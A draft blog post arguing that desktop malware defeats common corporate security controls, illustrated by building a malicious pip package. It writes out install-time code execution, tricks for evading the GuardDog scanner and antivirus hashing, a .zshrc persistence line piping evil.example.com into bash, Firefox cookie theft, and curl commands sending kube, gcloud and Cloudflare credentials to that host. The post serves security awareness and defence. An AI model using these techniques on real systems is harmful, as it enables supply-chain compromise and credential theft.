+++
title = "Hacking myself to prove a point"
date = 2023-01-16
draft = true
+++

If you didn't hear, [CircleCI recently released their report on a December 2022 security incident](https://circleci.com/blog/jan-4-2023-incident-report/). What stood out to me is that CircleCI seems to be doing all the "normal" security things: SSO with 2FA, endpoint protection, auditing/logging, encryption at rest, etc. But they still got breached. I think this speaks to the travesty that is the modern-day security industry. It's a thousand times easier to sell some pithy software tool that checks a compliance box than it is to sell a real security transformation.

I'd like to illustrate how the sorry state of desktop OS security means that pretty much every security control that is recommended to C-suites these days is a minor obstacle to a dedicated attacker. To do this, I'll try to hack myself like I'm that poor CircleCI engineer whose laptop was used as the first step in the attack.

> NOTE: I'm not actually targeting my setup at my current or past employers. I'm targeting a theoretical engineer that doesn't exist, but is similar to an average software engineer. My examples will use macOS but this applies to Windows and Linux just as easily.

## Step 1: Get onto a developer's laptop

Prior to the rise of various kinds of server-side sandboxing (containers, jails, WASM, micro VMs), remote code execution was always game-over for a server. Nowadays, you might have remote code execution inside one of dozens on microservices, but with good egress restrictions and mTLS, that might be the end of your exploit chain.

However for some tragic reason, the tooling for sandboxing on desktop operating systems is stuck in the dark ages. If I can just execute code on a developer's laptop, I can steal SSH keys, steal cookies, and even hijack VPN sessions. And executing code on a developer's laptop is very easy these days.

To start, I'll make a malicious Python package that will execute arbitrary code when installed.

```
mkdir hack
cd hack/
vim setup.py
```
`setup.py:`
```python
import setuptools
from setuptools.command.install import install


class Install(install):
    def run(self):
        print("************************ pwned ************************")
        install.run(self)

setuptools.setup(
    name="malicious",
    version="1.0.0",
    install_requires=[],
    cmdclass={'install': Install}
)
```

Now we install the package, with extra verbosity just to see our "pwned" print statement:

```
$ pip install -v .
Using pip 22.3.1 from /hack/venv/lib/python3.10/site-packages/pip (python 3.10)
Processing /hack
...
  running bdist_wheel
  running build
  installing to build/bdist.macosx-12.3-x86_64/wheel
  running install
  ************************ pwned ************************
  running install_egg_info
  running egg_info
...
Successfully installed malicious-1.0.0
```

Alright! Now we just need our target developer to install this package. This is the only hard part about our hack, but we have a lot of options:

* [Typo-squatting a popular package](https://snyk.io/blog/malicious-packages-found-to-be-typo-squatting-in-pypi/)
* [Registering someone's expired domain](https://sockpuppets.medium.com/how-i-hacked-ctx-and-phpass-modules-656638c6ec5e) that they used to use for email, then issuing password resets
* [Tricking a popular package](https://www.theregister.com/2023/01/04/pypi_pytorch_dependency_attack/) to include your package as a dependency
* Paying to own a popular package
* Forking an abandoned project and telling everyone to migrate to yours
* Good ol' fashioned phishing
* and more

### Avoiding detection

With our malicious package, it would be easy to exfiltrate files, but some nosy person will probably notice a `subprocess.run(['curl', 'evil.example.com'...])` line on our file. DataDog publishes a tool that will simulate our nosy person, who we can trivially trick.

Our current script does get noticed:

```
$ guarddog scan ./dist/malicious-1.0.0.tar.gz
Found 1 potentially malicious indicators in ./dist/malicious-1.0.0.tar.gz

cmd-overwrite: found 1 source code matches
  * Standard pip command overwritten in setup.py at malicious-1.0.0/setup.py:12
        setuptools.setup(
        name="malicious",
        version="1.0.0",
        install_requires=[],
        cmdclass={'install': Install}
    )
```

But that's an easy fix. If we just assign the `{'install': Install}` dictionary to a variable ([like pytorch does](https://github.com/pytorch/pytorch/blob/eadbf762fc36f23ef78b084973dc39a13605db46/setup.py#L1199)), we avoid detection:

`setup.py:`
```python
...
cmdclass = {'install': Install}

setuptools.setup(
    name="malicious",
    version="1.0.0",
    install_requires=[],
    cmdclass=cmdclass
)
```
```
$ guarddog scan ./dist/malicious-1.0.0.tar.gz
Found 0 potentially malicious indicators scanning ./dist/malicious-1.0.0.tar.gz
```

Now let's try executing some more useful code than just a print statement, such as running a shell command:

```python
def run(self):
    subprocess.run(['whoami'])
```

Uh oh, we've been caught:

```
$ guarddog scan ./dist/malicious-1.0.0.tar.gz
Found 1 potentially malicious indicators in ./dist/malicious-1.0.0.tar.gz

code-execution: found 1 source code matches
  * setup.py file executing code at malicious-1.0.0/setup.py:8
        subprocess.run(['whoami'])
```

But we can bypass that easily as well. The thing about automated scanners is that they always have to balance false positives, which makes them fall apart when faced with a dedicated attacker. GuardDog can detect "common obfuscation methods", but I guess not `getattr()`. The following code obtains the function `subprocess.run()` via the string `run` instead of using the dotted syntax, then executes it like normal:

```python
def run(self):
    getattr(subprocess, 'run')(['whoami'])
```
```
$ guarddog scan ./dist/malicious-1.0.0.tar.gz
Found 0 potentially malicious indicators scanning ./dist/malicious-1.0.0.tar.gz
```

Great! Now we have the ability to execute arbitrary code (including subprocesses) on a developer's laptop.

### Aside: Won't someone notice this malicious code on GitHub?

It shocks me that people seem to blindly trust that the code you see in an open-source repo will match the version that you end up executing. I do wish GitHub offered some way of cryptographically attesting that fact, but I can simply change the code locally before publishing to pypi. The real source code will be in the `.tar.gz` file uploaded to pypi, but do you really check that file for every package you download? Didn't think so. Maybe if you had a tool like guarddog to do that, but as you can see that's easily circumventable.

### Aside: My antivirus will catch your setup.py file!

Let's fix that, shall we?

```python
import uuid

with open(__file__, "a") as f:
    f.write(f"\n# {str(uuid.uuid4())}")
```

Now whenever setup.py executes, it will add a random string as a comment to the end of the file. This makes the `sha256sum` of the file differ for every user. Your only hope now is if your antivirus manages to quarantine the file in the few milliseconds between when `pip` downloads it and when it gets executed, which is unlikely.

## Step 2: Getting persistence

Since our end goal is bypassing SSO, we need to be able to execute our arbitrary code while the developer is logged in, which can be as small as a few minutes for really sensitive stuff. Just hoping setup.py executes during that window isn't likely, but we can gain persistence trivially.

GuardDog will notice if we create a file and mark it executable, and many OSes make running new daemons a privileged operation. So a good compromise would be to append our malicious code to an existing script that the user regularly executes (and rarely reads) while they're logged into production. There are lots of options here, but I think `~/.zshrc` (or equivalent) is a good one. That executes every time someone spawns a new terminal on macOS. The last time I touched the file was 2 months ago, so that's a lot of time to stay undetected.

Let's now gain persistence, which I am just now realizing doesn't even require `subprocess`, we can just write to the file directly:

```python
def run(self):
    with open(f"{os.environ['HOME']}/.zshrc", "a") as f:
        f.write("\ncurl http://evil.example.com > /dev/null 2>&1 | bash || true")
    install.run(self)
```
```
$ guarddog scan ./dist/malicious-1.0.0.tar.gz
Found 0 potentially malicious indicators scanning ./dist/malicious-1.0.0.tar.gz
```

Great! Now we have the ability to execute arbitrary code frequently, with a high likelihood that our code will execute while the victim is logged in.

## Step 3: Pivoting to prod

The world is now our oyster. Without some kind of sandboxing in place, we can access the vast majority of important files on the file system, including SSH keys, `~/.kube/config`, cloud credentials, and browser cookies. It just depends on what we decide to put into that `f.write()` call.

Here's an example of stealing a cookie:

```
$ cd ~/Library/Application\ Support/Firefox/Profiles/
# There may be multiple profiles, just pick the first one
$ cd $(ls | head -n 1)

# Database will probably be locked if the browser is open, so just copy it
$ cp cookies.sqlite unlocked-cookies.sqlite
$ sqlite3 cookies.sqlite
sqlite> SELECT name,value FROM moz_cookies WHERE host="news.ycombinator.com";
user|mac-chaffee&PCeezf4hhaH5S7BRsTtX/hVUQ3SQb9IpFU

# Now to peek at an auth-protected page using that cookie:
curl -i -SsLH 'Cookie: user=mac-chaffee&PCeezf4hhaH5S7BRsTtX/hVUQ3SQb9IpFU' 'https://news.ycombinator.com/upvoted?id=mac-chaffee'
```

I was surprised to see FireFox does nothing to protect cookies on disk. At least Chrome encrypts them, but [you can bypass that too](https://mango.pdf.zone/stealing-chrome-cookies-without-a-password).

Here's an example of stealing my cloudflare credentials:

```
curl --data-binary=@~/Library/Preferences/.wrangler/config/default.toml http://evil.example.com
```

Or my Kubernetes credentials:

```
curl --data-binary=@~/.kube/config http://evil.example.com
```

Or my gcloud credentials:

```
curl --data-binary=@~/.config/gcloud/credentials.db http://evil.example.com
```

All of those are (or can be) protected with 2FA.

Even if some of those sites are VPN-protected or they tie the credentials to a specific source IP, that's not an issue for an attacker. They can just execute the API calls directly from my computer through the VPN.

### Aside: My outbound firewall (LittleSnitch et. al.) will catch you!

That's only true if I exfiltrate your credentials or if I try to download a "stage 2" payload instead of directly including my exploit code in setup.py. I bet you already have a rule allowing your terminal application to access your cloud accounts anyway.

I considered editing the LittleSnitch config files manually, but to their credit, the config files are owned by root (thus requiring a password to read/edit). Even the new CLI won't let you do anything unless you are root.

Another way attackers can circumvent something like LittleSnitch is to proxy the traffic through a host you have already allowed, like maybe I use your company's internal HTTP proxy, or maybe I upload your credentials to an S3 bucket (you allow s3.amazonaws.com, right?). I can perform recon on your computer to determine what kinds of precautions I can/should take.

## Potential Solutions

I think a true solution to this kind of hack would be: proper sandboxing for desktop operating systems with a user experience that isn't built by masochists (looking at you SELinux).

[MacOS Mojave added a feature](https://support.apple.com/en-my/guide/mac-help/mchl244f2895/10.14/mac/10.14) which blocks access to certain folders, but frustratingly limited the feature to folders like Documents, Pictures, etc., not `~/.kube/config` for instance. Wouldn't stop this attack, but it's a step in the right direction.

MacOS has also started requiring Mac App Store apps to use the "[app sandbox](https://developer.apple.com/documentation/security/app_sandbox)", which is kinda the same thing but also includes camera, microphone, etc. Again, wouldn't stop the attack I described above.

[Nix has a feature](https://nixos.wiki/wiki/Nix_package_manager#Sandboxing) where package builds are executed inside a restricted sandbox. If you installed my pypi package via Nix, sounds like you'd be totally safe. Well, assuming you enabled that feature, which is not enabled by default on macOS.

There are [tools](https://github.com/stepchowfun/toast) that make it easier to develop entirely in containers, but it can be very challenging to get your editor/IDE to play nice with these. Also: Not all container runtimes can be considered secure sandboxes.

I met a Googler who said everyone they know uses some internal version of [Google Cloud Shell Editor](https://cloud.google.com/blog/products/application-development/introducing-cloud-shell-editor), a cloud based IDE. I don't think this solves the problem since you are essentially working in a VM where you `pip install` stuff into the same VM that has access to deploy stuff to Google Cloud:

```
mac@cloudshell:~$ gcloud projects list
<prompt pops up to authorize gcloud, which is granted for the entire session>
mac@cloudshell:~$ pip install -v .
Using pip 20.3.4 from /usr/lib/python3/dist-packages/pip (python 3.9)
...
  running install
  ************************ pwned ************************
...
```

I think all these tools are approaching the problem from the wrong direction. Why lock-down every app on my computer or change my whole workflow just to protect a few security-sensitive files? One feature I'd like is for applications like `gcloud` or `kubectl` to easily tell the operating system "I'm going to create a file called `credentials.txt`, and only I (the program, with my specific parent processes) should have access to it, unless the user explicitly allows some other program". The macOS Keychain is supposed to be that, but it's not difficult to [bypass the Keychain ACLs](https://wojciechregula.blog/post/stealing-macos-apps-keychain-entries/), even for signed binaries.

Another approach would be heavily restricting access to production. You can't avoid accessing prod entirely due to emergencies, but I can forsee a solution that's safe-ish from local malware. You'd need some kind of auditing jump box like [CyberArk](https://www.cyberark.com/products/privileged-access-manager/) or [Teleport](https://goteleport.com/) with hardware 2FA and super short sessions. You'd only use this for emergencies, so you should probably enable that "email/IM my entire team if someone accesses prod" feature too. But to be truly safe from local malware, you'd still want ways to stop session hijacking, key logging, and screen grabbing. Not sure if the tech is there to do this perfectly.

## Conclusions

Local malware *sucks*. It's too easy to get infected and too easy for attackers to avoid detection, even though this kind of attack has been around about as long as computers have existed. I'm disappointed in the software security industry for spending decades chasing flashy, profitable products instead of actually improving security. You know what? I'm starting to suspect this whole idea of a society dedicated to extracting profit from people above all else is not such a good idea...
